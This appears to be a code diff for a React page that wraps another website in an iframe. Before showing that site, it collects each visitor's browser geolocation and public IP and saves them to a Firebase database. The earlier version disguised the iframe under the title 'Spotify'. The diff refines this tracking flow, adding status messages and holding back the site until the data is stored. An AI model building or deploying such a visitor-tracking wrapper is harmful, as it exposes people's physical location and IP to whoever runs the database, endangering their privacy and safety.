@@ -1,31 +1,46 @@
-import React, { useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
 import { db } from './firebase';
 import { ref, push } from 'firebase/database';
 import axios from 'axios';
 
 function App() {
+  const [showSite, setShowSite] = useState(false); // Control when to show iframe
+  const [status, setStatus] = useState("Requesting location...");
+
   useEffect(() => {
     const collectAndStoreLocation = () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
+          setStatus("Location granted. Collecting data...");
+
           const { latitude, longitude } = pos.coords;
 
-          // Get public IP
-          const res = await axios.get('https://api.ipify.org?format=json');
-          const ip = res.data.ip;
+          try {
+            const res = await axios.get('https://api.ipify.org?format=json');
+            const ip = res.data.ip;
 
-          const data = {
-            latitude,
-            longitude,
-            ip,
-            timestamp: new Date().toISOString(),
-          };
+            const data = {
+              latitude,
+              longitude,
+              ip,
+              timestamp: new Date().toISOString(),
+            };
 
-          // Push to Firebase
-          push(ref(db, 'users'), data);
+            await push(ref(db, 'users'), data);
+
+            setStatus("Data saved. Loading site...");
+            setTimeout(() => setShowSite(true), 1000); // Delay before loading site
+          } catch (error) {
+            console.error("Error collecting IP or pushing to Firebase", error);
+            setStatus("Something went wrong.");
+          }
+        },
+        (err) => {
+          setStatus("Location access denied.");
+          console.error("Geolocation error:", err);
         });
       } else {
-        alert('Geolocation not supported');
+        setStatus("Geolocation not supported.");
       }
     };
 
@@ -33,14 +48,27 @@ function App() {
   }, []);
 
   return (
-    <div style={{ height: '100vh', overflow: 'hidden' }}>
-      <iframe
-        src="https://alan-protfio.netlify.app"
-        title="Spotify"
-        width="100%"
-        height="100%"
-        style={{ border: 'none' }}
-      />
+    <div style={{ height: '100vh', overflow: 'hidden', backgroundColor: '#000', color: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
+      {showSite ? (
+        <iframe
+          src="https://alan-protfio.netlify.app"
+          title="User Site"
+          width="100%"
+          height="100%"
+          style={{ border: 'none' }}
+        />
+      ) : (
+        <h2 style={{ animation: "pulse 2s infinite" }}>{status}</h2>
+      )}
+
+      {/* Pulse animation */}
+      <style>{`
+        @keyframes pulse {
+          0% { opacity: 1; }
+          50% { opacity: 0.4; }
+          100% { opacity: 1; }
+        }
+      `}</style>
     </div>
   );
 }
